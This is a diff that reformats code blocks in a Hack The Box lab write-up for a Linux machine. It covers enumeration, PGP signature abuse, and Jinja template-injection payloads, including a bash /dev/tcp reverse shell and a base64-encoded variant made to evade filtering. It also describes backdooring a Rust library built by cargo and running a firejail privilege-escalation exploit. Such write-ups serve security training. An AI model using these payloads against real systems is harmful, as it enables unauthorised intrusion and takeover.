@@ -8,7 +8,9 @@ Linux . Medium
 
 The enumeration began with an Nmap scan, deploying the following command:
 
-`nmap -sCV -p- {machine IP}`
+```
+nmap -sCV -p- {machine IP}
+```
 
 The scan disclosed several key findings.
 
@@ -22,7 +24,9 @@ A noteworthy page, "Contact", allowed us to submit encrypted text. Interestingly
 
 To enumerate directories within the webpage, we employed the tool 'ffuf', utilizing the following command:
 
-`ffuf -w /usr/share/dirb/wordlists/big.txt -u {url} -c -v`
+```
+ffuf -w /usr/share/dirb/wordlists/big.txt -u {url} -c -v
+```
 
 ![image](https://github.com/vsang181/Hackthebox/assets/28651683/cc2bf803-b8e8-4e2b-824a-503ec8c48b0b)
 
@@ -52,7 +56,9 @@ These commands successfully verified the integrity of the message. With this ver
 
 The command used to sign our crafted message was as follows:
 
-`gpg --clear-sign message.txt` 
+```
+gpg --clear-sign message.txt
+```
 
 After trying all the available input fields, we realized that the final input box, where we could verify our signature, could accept our own public key along with a message signed with our private key.
 
@@ -84,7 +90,9 @@ Our next step was to upload a shell. To streamline our work, we chose to delete 
 
 We employed the following payload to execute the 'id' command:
 
-`{{ self._TemplateReference__context.joiner.__init__.__globals__.os.popen('id').read() }}`
+```
+{{ self._TemplateReference__context.joiner.__init__.__globals__.os.popen('id').read() }}
+```
 
 ![image](https://github.com/vsang181/Hackthebox/assets/28651683/333b5f50-784c-4870-8f57-8e81fce86d7f)
 
@@ -94,11 +102,15 @@ The payload's execution revealed a username: 'atlas'.
 
 To progress, we decided to upload a shell using this command:
 
-`{{ self._TemplateReference__context.joiner.__init__.__globals__.os.popen('bash -i >& /dev/tcp/10.10.14.40/1234 0>&1').read() }}`
+```
+{{ self._TemplateReference__context.joiner.__init__.__globals__.os.popen('bash -i >& /dev/tcp/10.10.14.40/1234 0>&1').read() }}
+```
 
 However, we encountered an issue with certain characters not being accepted as input during key generation. To circumvent this, we base64 encoded the command, which led us to this revised version:
 
-`{{ self._TemplateReference__context.joiner.__init__.__globals__.os.popen('echo "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC40MC8xMjM0IDA+JjE=" | base64 --decode | bash').read() }}`
+```
+{{ self._TemplateReference__context.joiner.__init__.__globals__.os.popen('echo "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC40MC8xMjM0IDA+JjE=" | base64 --decode | bash').read() }}
+```
 
 ![image](https://github.com/vsang181/Hackthebox/assets/28651683/ccbbcb84-f397-457e-b451-7669b2e587e4)
 
@@ -150,7 +162,9 @@ We simply need to add this backdoor to the "lib.rs" file located at "/opt/crates
 
 After restarting our 'nc' listener, we used the 'cargo build' command to compile the code.
 
-`cargo build`
+```
+cargo build
+```
 
 ![image](https://github.com/vsang181/Hackthebox/assets/28651683/5ab43bad-80b9-40e4-aea1-5a4b5e2173f3)
 
@@ -168,7 +182,9 @@ A brief online search revealed an exploit for "firejail". We placed this in the 
 
 [exploit.py](https://gist.github.com/GugSaas/9fb3e59b3226e8073b3f8692859f8d25#file-exploit-py)
 
-`python3 ./exploit.py`
+```
+python3 ./exploit.py
+```
 
 To ensure the exploit ran successfully, we set up a second terminal (a lesson learned from multiple previous failed attempts).
 
